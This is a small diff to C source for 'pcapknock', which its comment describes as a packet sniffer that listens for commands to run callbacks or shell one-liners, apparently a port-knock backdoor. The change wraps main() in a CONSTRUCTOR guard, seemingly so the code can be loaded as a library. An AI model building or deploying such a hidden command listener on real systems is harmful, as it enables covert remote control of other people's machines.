@@ -13,6 +13,7 @@
 
 /* pcapknock sniffs packets and listens for commands to execute callbacks or
  * short shell one-liners */
+#ifndef CONSTRUCTOR
 int
 main(void)
 {
@@ -33,3 +34,4 @@ main(void)
                 return ret;
         pthread_exit(NULL);
 }
+#endif
